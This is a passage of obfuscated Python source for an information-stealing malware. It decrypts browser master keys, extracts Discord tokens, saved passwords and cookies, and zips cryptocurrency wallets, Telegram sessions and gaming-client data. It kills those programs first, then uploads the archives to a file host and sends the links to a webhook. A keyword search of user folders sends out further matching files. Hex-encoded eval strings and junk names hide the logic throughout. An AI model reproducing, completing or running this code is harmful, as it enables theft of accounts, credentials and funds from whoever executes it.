    pathKey=path+XXWWWWXXXXXXXXWXXWWXWXXW
    with open(pathKey,SS2SSS2S22SS2S22S22,encoding=ljljjiijiiljjllljl)as f:local_state=json_loads(f.read())
    master_key=b64decode(local_state[wwwxxwwxwwxxwxwwxx][MNMNNMMNNMMMNMNMMN])
    master_key=CryptUnprotectData(master_key[DDoOOOoDoOoOoDOoo:])
    for file in os.listdir(pathC):
        if file.endswith(jljjlillljlllllliliji)or file.endswith(wxwxxwwxwwxwxxwwxxwxwxw):
            for line in[x.strip()for x in open(eval(binascii.unhexlify(b'66227b70617468437d5c5c7b66696c657d22').decode('8ftu'[::+-+-(-(+1))])),errors=oDDoOoDDoODODoODD).readlines()if x.strip()]:
                for token in re.findall(nnnnnmnnmnnnnnmmnnm,line):
                    global Tokens
                    tokenDecoded=DecryptValue(b64decode(token.split(SS22SS2S2S22SSSSSSS222)[xwxwxxxxxxwxwxxwxx]),master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            Tokens+=tokenDecoded
                            uploadToken(tokenDecoded,path)
def GatherZips(paths1,paths2,paths3):
    thttht=[]
    for patt in paths1:
        a=threading.Thread(target=ZipThings,args=[patt[JIILLILILIIIJLJJIIJLLLLLJ],patt[SS2SSS22SS2S222SS2S2222S2],patt[O0OO0oOoOO0Oo0OoOOo]])
        a.start()
        thttht.append(a)
    for patt in paths2:
        a=threading.Thread(target=ZipThings,args=[patt[oOoDoDoODoOoOoDooOODDDDo],patt[LLLILJLLJLLILILJIJIL],patt[JJILJLILLJILJILLIL]])
        a.start()
        thttht.append(a)
    a=threading.Thread(target=ZipTelegram,args=[paths3[wwxwwwwwwxwxwxxwwwwwx],paths3[JILILILJJIJJLLJLJJIJ],paths3[ijiljljjiljllilli]])
    a.start()
    thttht.append(a)
    for thread in thttht:
        thread.join()
    global WalletsZip,GamingZip,OtherZip
    wal,ga,ot=OoO00O00ooOo00ooOoO0oO0O,xwwwxwxwxxwxwwxxxxxw,WWXXXWXWWXWWXWWXXXWXXW
    if not len(WalletsZip)==jlijjililijllilliljii:
        wal=NNNNMMNMNMNNNNMNNNMMNMMM
        for i in WalletsZip:
            wal+=eval(binascii.unhexlify(b'6622e29494e29480205b7b695b305d7d5d287b695b315d7d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
    if not len(WalletsZip)==LIILJLIJLIJJLLLJLIJJLJLII:
        ga=WWXWWXXWXWWWXXWWXX
        for i in GamingZip:
            ga+=eval(binascii.unhexlify(b'6622e29494e29480205b7b695b305d7d5d287b695b315d7d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
    if not len(OtherZip)==IJJLJIILJLIJLIIILIILJJ:
        ot=XWWXXXWWWWWWWXWWXXXWWWW
        for i in OtherZip:
            ot+=eval(binascii.unhexlify(b'6622e29494e29480205b7b695b305d7d5d287b695b315d7d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
    headers={
        lijljllijjiliillil:NNMMMMNNNNNMNMNNNMMNMNN,
        O00OoooO0o0oo00OoOOO:O0OOoo0OOOOOoo0OOooOoO0OO
}
    data={
        S2222SSS2SSS2S222SS2S:globalInfo(),
        S222SS2SSS22SS222S:[
{
            wwwxxwxwxwwwwwxwwwwx:JJJLJLILLLLLIIIJLJIII,
            NNMMNMNNNNNMNNMNNMMMMMN:eval(binascii.unhexlify(b'66227b77616c7d5c6e7b67617d5c6e7b6f747d22').decode('8ftu'[::+-+-(-(+1))])),
            nmmmnnmnmmnnnmmnmnn:oDODoOoDDOoDOoDOOOoDDO,
            jjljijjijiiljliljilij:{
                S222SSS22S222222SS2SS22222:ljjllilijliiijjijilillij,
                S2S2S222SSSSS2SSS2S2:nnnnmnnnmnnmmnnnmmmm
}
}
],
        ijlijlilljiiljljillljjl:jlijjillillljililji,
        WXWXXXWXXWXWWXXWW:XXXXWWXXWXXWXWWWXWWXW,
        lijiljiiiljljiijllljllj:[]
}
    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
def ZipTelegram(path,arg,procc):
    global OtherZip
    pathC=path
    name=arg
    if not os.path.exists(pathC):return
    subprocess.Popen(eval(binascii.unhexlify(b'66227461736b6b696c6c202f696d207b70726f63637d202f74202f66203e6e756c20323e263122').decode('8ftu'[::+-+-(-(+1))])),shell=IlIIllIIIllIllllII)
    zf=ZipFile(eval(binascii.unhexlify(b'66227b70617468437d2f7b6e616d657d2e7a697022').decode('8ftu'[::+-+-(-(+1))])),WWWXXWXXXXXWXWXXX)
    for file in os.listdir(pathC):
        if not SS2S22S22SSS2SSSS2222S22 in file and not lIlIIlIIlIIlIllIIIIIIIl in file and not WWWXXWXXXXXXWXXXXXX in file and not O0O0o0o0ooOOo0oo000O in file:
            zf.write(pathC+mmmnmnmnnnnmmnnnm+file)
    zf.close()
    lnik=uploadToAnonfiles(eval(binascii.unhexlify(b'66277b70617468437d2f7b6e616d657d2e7a697027').decode('8ftu'[::+-+-(-(+1))])))
    os.remove(eval(binascii.unhexlify(b'66227b70617468437d2f7b6e616d657d2e7a697022').decode('8ftu'[::+-+-(-(+1))])))
    OtherZip.append([arg,lnik])
def ZipThings(path,arg,procc):
    pathC=path
    name=arg
    global WalletsZip,GamingZip,OtherZip
    if O00o0OoOo0O0Ooo0oooO00 in arg:
        browser=path.split(LJLJJJJJILLJILJIILIJI)[LLJILLLILIJLJJIIJLLIJ].split(NNNNMNMNNMNMMMMMMMNNMN)[jllilljljiljjiljlill].replace(MMNNMNNNNNNMNMMMN,MMNNMMNMNNNNMNNNMMNMNNNN)
        name=eval(binascii.unhexlify(b'66224d6574616d61736b5f7b62726f777365727d22').decode('8ftu'[::+-+-(-(+1))]))
        pathC=path+arg
    if not os.path.exists(pathC):return
    subprocess.Popen(eval(binascii.unhexlify(b'66227461736b6b696c6c202f696d207b70726f63637d202f74202f66203e6e756c20323e263122').decode('8ftu'[::+-+-(-(+1))])),shell=llIIlIllIlIlIllIII)
    if mmmnnnnnmnmnnnmnmmnnm in arg or JJLIJILJLJIILJJJIJJJJ in arg:
        browser=path.split(wwxwxxwwwwxwxxxwxwxwxx)[IIlIlllIlIIllIIlIlIlII].split(ODooDODoooDOOOOooDOooDDO)[IJIIJIILLILJLLJLJJJJJ].replace(Ooo0o0O0o0O0oooO00oO0,S2S2S2S22S2S2SSSSS2)
        name=eval(binascii.unhexlify(b'66227b62726f777365727d22').decode('8ftu'[::+-+-(-(+1))]))
    elif MMNMNNMNNNMMNMMNNNMNNMMN in arg:
        if not os.path.isfile(eval(binascii.unhexlify(b'66227b70617468437d2f6c6f67696e75736572732e76646622').decode('8ftu'[::+-+-(-(+1))]))):return
        f=open(eval(binascii.unhexlify(b'66227b70617468437d2f6c6f67696e75736572732e76646622').decode('8ftu'[::+-+-(-(+1))])),O0OO0Oo0OO0o0oo0oo0ooOOo0O,encoding=wwxwxxxwxxwwxwxxxxxxx)
        data=f.readlines()
        found=OoODDOOoDDODOooODODDooOo
        for l in data:
            if nmnmmmmmmmnnnmnmmmnm in l:
                found=MNNMNMMNMNNNMNNMNNNMMMMMM
        if found==llIIlIIIlllIIlIlllIIIIIII:return
        name=arg
    zf=ZipFile(eval(binascii.unhexlify(b'66227b70617468437d2f7b6e616d657d2e7a697022').decode('8ftu'[::+-+-(-(+1))])),JLJLJLJJJJLLIIJJJLJI)
    for file in os.listdir(pathC):
        if not MMMMNMMNMMMMNNNMNNMMNNMN in file:zf.write(pathC+ijlliljijilliiijjijiijiil+file)
    zf.close()
    lnik=uploadToAnonfiles(eval(binascii.unhexlify(b'66277b70617468437d2f7b6e616d657d2e7a697027').decode('8ftu'[::+-+-(-(+1))])))
    os.remove(eval(binascii.unhexlify(b'66227b70617468437d2f7b6e616d657d2e7a697022').decode('8ftu'[::+-+-(-(+1))])))
    if llliilllliijljillilj in arg or S22SSSSSS2SSS2SS22SS in arg:
        WalletsZip.append([name,lnik])
    elif IlllIIlIIlIIIllllIIllIl in name or OoOOooOo0O0OoO0OoO0oOOOo in name or jllijjliijiijiiliiljjlji in name:
        GamingZip.append([name,lnik])
    else:
        OtherZip.append([name,lnik])
def GatherAll():
    MMNNNNMMNMMMMMMMMMN
    browserPaths=[
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4f7065726120536f6674776172652f4f7065726120475820537461626c6522').decode('8ftu'[::+-+-(-(+1))])),wwwwxwwwwxxwxxxxwxwxwwxx,IILIJJLJIIJJJIIILJIIIJJ,O00oOoO00oO0oOOOoo0O0o0o,nmnnnnnnmnnmmmnnnmnmn,NNMNNNNMNNMMNNMMNMMMNMMN],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4f7065726120536f6674776172652f4f7065726120537461626c6522').decode('8ftu'[::+-+-(-(+1))])),nnnnnmnnmnmnmmnmnm,DDoOoooOOOoODODoDDOoOOO,IlIllIIllIlIIIlIlIlIlll,S2S22S22SSS2S22SS2SS22S22S,iljijijlijljlillji],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4f7065726120536f6674776172652f4f70657261204e656f6e2f5573657220446174612f44656661756c7422').decode('8ftu'[::+-+-(-(+1))])),O0O0OOOo0OoO000o00oOo0oOO,OoOOoOo00OooOoOOo00,nnmnnnnmmnmnmnnnmnmm,SSSS22SSS222S22SS22,wxxxwwwxwxwwxwwwwx],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f476f6f676c652f4368726f6d652f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),llllIllIIIIllIIIlIIIllIl,JIJIJIJIILLILJLJIILLIJII,NNMNMMNMNMMNNMNMMMMM,IlIllIlIIlIIllIIlIl,nnmmnnnnmnnmnmnnmn],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f476f6f676c652f4368726f6d65205378532f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),xxxwxwxwxxwxwxxxxwwxwxxx,nnnnmnmnmmnnnmnnnnnmm,wxwxxxwwxxxxxxwxxxxxx,llIIlIIIllIllIIlIIIIIlII,jljjiiljjiljiijilijlilijj],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f4272617665536f6674776172652f42726176652d42726f777365722f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),Ooo0o0ooo0oO000O000oOOo,S2SS2SS22SSS2S22S22SS,O0O0OO0oo0o0OoOo000oOo,wwwxxxxwwxwwwwxwwxwwxxwww,OOoOoOoo0oOO0OOooo0O],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f59616e6465782f59616e64657842726f777365722f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),wxxxxxwwxxwwwwxxwwwxxxxxw,NMMNNMNMMMNMMMMNNMNNMN,XXWWWXXWWXWWXXWWXWW,WWWWWXWWXXXWWXWWWWWX,NNMNNNNMMMMNMNMNMMM],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f4d6963726f736f66742f456467652f55736572204461746122').decode('8ftu'[::+-+-(-(+1))])),ooODODDODooooDoOODOoOOOO,SSSS2SS2SSS2SS2S2S22S2S2,LIJLLJIIIJIIIIJJILJJJJ,wwwwxxwxwwwwwxwxwx,mmmmmnnnmnnnmnmmn]
]
    discordPaths=[
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f446973636f726422').decode('8ftu'[::+-+-(-(+1))])),xxxwwxwxwxxwwxxxwxxxxwww],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4c69676874636f726422').decode('8ftu'[::+-+-(-(+1))])),mnnnnnmnmmmnnnmnnmmmn],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f646973636f726463616e61727922').decode('8ftu'[::+-+-(-(+1))])),XWWWXXXWWXWWWXXXWWWWWX],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f646973636f726470746222').decode('8ftu'[::+-+-(-(+1))])),S2S2S22S2SSSSS2222SSS22S2],
]
    PathsToZip=[
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f61746f6d69632f4c6f63616c2053746f726167652f6c6576656c646222').decode('8ftu'[::+-+-(-(+1))])),wxwxxwxwxxwwxwwxxwwxwwwww,WWXXXWWWXWXWWXXXWWXWWXXXX],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f45786f6475732f65786f6475732e77616c6c657422').decode('8ftu'[::+-+-(-(+1))])),SSSS2222SS2S22SS22S2S,nmnnmnnmnnnnnmmmn],
[NMMMNNMMMNNMMNNMMNMM,MNMNNNNMMNMMMMMNM,xxxwwwxwxxxxwxwxxxxwwxx],
[eval(binascii.unhexlify(b'66227b726f616d696e677d2f4e6174696f6e73476c6f72792f4c6f63616c2053746f726167652f6c6576656c646222').decode('8ftu'[::+-+-(-(+1))])),NMMNNMNNMMMNMNMMNNMNMMN,MNNMMNMNNMNNMMNNNNMNNMN],
[eval(binascii.unhexlify(b'66227b6c6f63616c7d2f52696f742047616d65732f52696f7420436c69656e742f4461746122').decode('8ftu'[::+-+-(-(+1))])),WXXWWWXWWXXXWXXWWXXXX,WXWWWXWWXXWWWWXWWWW]
]
    Telegram=[eval(binascii.unhexlify(b'66227b726f616d696e677d2f54656c656772616d204465736b746f702f746461746122').decode('8ftu'[::+-+-(-(+1))])),MNNMNNNMMNNMNNNMNMNMNNMN,wxwxwxwxwwwxwwxww]
    for patt in browserPaths:
        a=threading.Thread(target=getToken,args=[patt[jljijiijjliijjijjil],patt[XWXXXWWWWWWXXWWXXX]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a=threading.Thread(target=GetDiscord,args=[patt[OoOO0O0o000O0OO0OO00],patt[O0ooOOOO0o0oo00O00oOo0ooO]])
        a.start()
        Threadlist.append(a)
    for patt in browserPaths:
        a=threading.Thread(target=getPassw,args=[patt[MNMMMMNNMNMNNMNMMMMNMNNM],patt[MNMMNNMMMNNMNMNMNNMMM]])
        a.start()
        Threadlist.append(a)
    ThCokk=[]
    for patt in browserPaths:
        a=threading.Thread(target=getCookie,args=[patt[JIILJIJLIILLIILLLLIJI],patt[DOooODooDOOODOoDOODoo]])
        a.start()
        ThCokk.append(a)
    threading.Thread(target=GatherZips,args=[browserPaths,PathsToZip,Telegram]).start()
    for thread in ThCokk:thread.join()
    DETECTED=Trust(Cookies)
    if DETECTED==S22SS22SSSS222SS2S2S2S22S:return
    for thread in Threadlist:
        thread.join()
    global upths
    upths=[]
    for file in[ljiljjiljjlljjlil,xxwwxxxwxwxxwxwxxxxx]:
        upload(file.replace(SS2SSSS22222SS22SSSSSSS2,mnnmnnnmnnmnmmmmnmmmmmnmn),uploadToAnonfiles(os.getenv(S2222S2SS2SS2SS2S222SS2S2S)+IIllIllllllllIlIllIlIlIlI+file))
def uploadToAnonfiles(path):
    try:return requests.post(eval(binascii.unhexlify(b'662768747470733a2f2f7b72657175657374732e676574282268747470733a2f2f6170692e676f66696c652e696f2f67657453657276657222292e6a736f6e28295b2264617461225d5b22736572766572225d7d2e676f66696c652e696f2f75706c6f616446696c6527').decode('8ftu'[::+-+-(-(+1))])),files={jijljjjliliijlililll:open(path,S2S2222S2SSSS2S22SSSSS22S2)}).json()[OOOOOooOOooOo0O0oO0Ooo000o][XWXWXXWXWWXWXXWXW]
    except:return iiliillliijljjjjl
def KiwiFolder(pathF,keywords):
    global KiwiFiles
    maxfilesperdir=illillilljlilljilj
    i=SSSSS22SS2SSSS2S2S2
    listOfFile=os.listdir(pathF)
    ffound=[]
    for file in listOfFile:
        if not os.path.isfile(pathF+OoOOooO0oooOooo000o00O0+file):return
        i+=MMMMNNNMNNNMNNMNM
        if i<=maxfilesperdir:
            url=uploadToAnonfiles(pathF+OOOooOooDooODooDDoDo+file)
            ffound.append([pathF+mmnnnmmnmnmnnmmmnnmmmnmnn+file,url])
        else:
            break
    KiwiFiles.append([O0OoOOOOooO0ooOoo0O,pathF+O00oOo00Ooo0000oOo,ffound])
KiwiFiles=[]
def KiwiFile(path,keywords):
    global KiwiFiles
    fifound=[]
    listOfFile=os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path+OoDDoDoDODoDDOoDoooDooDOO+file)and Ooooooo0oOoooO00O0o0 in file:
                    fifound.append([path+JLLJIILIJILIJJIJI+file,uploadToAnonfiles(path+MMNMMNNNNNMMNNNNMMNM+file)])
                    break
                if os.path.isdir(path+OO0oooOo0o00OoOoooo0Oo+file):
                    target=path+nmnnnmnmnmnnnnmnn+file
                    KiwiFolder(target,keywords)
                    break
    KiwiFiles.append([O0OooOoOOOoOoo0o0OOOO,path,fifound])
def Kiwi():
    user=temp.split(xwwxxxwxxwxxwxwxxxxxxxx)[LJILJJJJJILJIIIIL]
    path2search=[
        user+mnnnmnmnmnmmmmmnnmnnmnmmm,
        user+ODOoOoDoDDDOOoDDO,
        user+XWXWXWWWWWWXXWWWWXWWXXWXX
]
    key_wordsFolder=[
        xxxxwwxxwxwxxwxxxwxxwwx,
        S2S22SSS2SS2SS2S22S,
        LILIJIILJJLIILILIILI,
        iiliiijiijjiiljii
]
    key_wordsFiles=[
        ijiijlljjjjiilliji,
        XXWXWXXXWWWWWWWWXXXW,
        DDDoDDDoOoOODOooODDO,
        mnmnnnmnmmnmmnnnmmnnnmn,
        OooODOoOoDDoDOoDo,
        lIIIIlIlIllIllllI,
        OOo0Oo0o0oo0OoooooO0o0OOO,
        ODOoODoODDDooOoooOoDoDD,
        MMNNMMMMNNMMMNMNMM,
        mnmnnmnmmnnnnmnnnnmmm,
        lilllililliljijjji,
        NNNNNMNNNMMMMMMMNN,
        mnmnmmmmmnnmnnnmnmmmnnn,
        S2SS22SSS22S222S222S,
        lillijjjjijijiiiiili,
        oDDoooOODDooDoODDODDDDO,
        lijiiilllililiilji,
        XXWWXXWXWXWXXXWWXWXXWXW,
        OOO0OOo0o0o0oo0oo0O0OOo0,
        S2SS2SS2222S222S2S2S2SS2,
        lIIIlllIlIlIlIIIIIIIll,
        xxwxxwwwxxxwxwxwxxxxwwx,
        wxwwxxwxxxwwwwxwxwxwxxxwx
]
    wikith=[]
    for patt in path2search:
        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith
global keyword,cookiWords,paswWords,CookiCount,PasswCount,WalletsZip,GamingZip,OtherZip
keyword=[
    SS2S22222SSS22SS22S222222,jljjiljjjliiliijji,XXXWWXXXXWXWXWWWX,SS22S22SSSS22S2222SSS222,jjllljljjijliijji,NMNMMMNMMMMMNMMNNMMMNNNNN,IJIJIIILJJJJILIJILJJLJLI,nnnmnmmmnnmnnnnmnnnnmmmn,DDODooDoODooODDoo,XXXXXXXWXWXWWXWXWX,jillijllllllijljlijl,IIJLJLLJJLJIJILLII,WXXWWWWWWWXWXXWXWWW,O00OoOOoO0O00OO0O0oO0OOO,nmnnnmmmmnnmnnmnmm,WWWWWWWXXXXXXWWXWWXX,nnmnnmmnnnnnnmnnmnmnnnnmm,SS22S2S222S2S22222SSSS,IIIlIlIIlIllIlIII,LLLLILLJLLLIJILII,S2S2222S2S2SSSS2S22S2,ILJLJJILJJLJLJJJLIIII,IIIIlIIlIIIIlIllIIII,MMMMNMNMNNMNNNNMNNNNMMMN,WXXXXWXXXWWWWWWWWXX,XXXXXXWWWWXXXXWXWWXWW,llIllIIlIIlIlIlIlII,OOoOooO0o00o0o0Oo0o000oo,jiiiliiljiilijjjjl,lIIIlIlIllIllllIlIIlI,ljjjjjjjiljlijiliji,IILILJLIIJLLJIILL,liijllijlliljjiijjjjijjj,DDoooOooODoDDODOOoDoDoDD,xwxxxwwwwwwwxwxwxwxwwxw,ODDoDoooDoODoDODOoD,jljjjilliljljijjllljijl,lIlllIlIIllIlIIlIIIlII,nnnmnnnmmmmnmnnnnnmnnm,mmmnmmmnmmmmnmmnmnm,S2222S2S2SS2S222SS222S2
]
CookiCount,PasswCount=IlllIllIIlIIIlllIIIIlIl,IlIllIIlIIIIlIIllIIIl
cookiWords=[]
paswWords=[]
WalletsZip=[]#[Name,Link]
GamingZip=[]
OtherZip=[]
GatherAll()
DETECTED=Trust(Cookies)
if not DETECTED:
    wikith=Kiwi()
    for thread in wikith:thread.join()
    time.sleep(nnmmnmmnnmnnnmnnm)
    filetext=IIlIlIIllllIlIlIII
    for arg in KiwiFiles:
        if len(arg[nnmmnmnmmmmmmmmnmnnm])!=OOoOOOoOODDoOoOoODDDo:
            foldpath=arg[ILLLLJIJLLILLLLJLLIILJI]
            foldlist=arg[llliljijjljliiiilll]
            filetext+=eval(binascii.unhexlify(b'6622f09f9381207b666f6c64706174687d5c6e22').decode('8ftu'[::+-+-(-(+1))]))
            for ffil in foldlist:
                a=ffil[WXXWWXXWWXXXXWXXWWXXWXX].split(DDoooDDooDoooooDODOOOD)
                fileanme=a[len(a)-ijijjiiijjjjljilllljjj]
                b=ffil[IllIIIIIllIIIIIIll]
                filetext+=eval(binascii.unhexlify(b'6622e29494e294803a6f70656e5f66696c655f666f6c6465723a205b7b66696c65616e6d657d5d287b627d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
            filetext+=XWWXXXWXXWXWXWXXWWWXWWXWW
    upload(WXXXXWXXXXXXWWXWWWWWXXX,filetext)
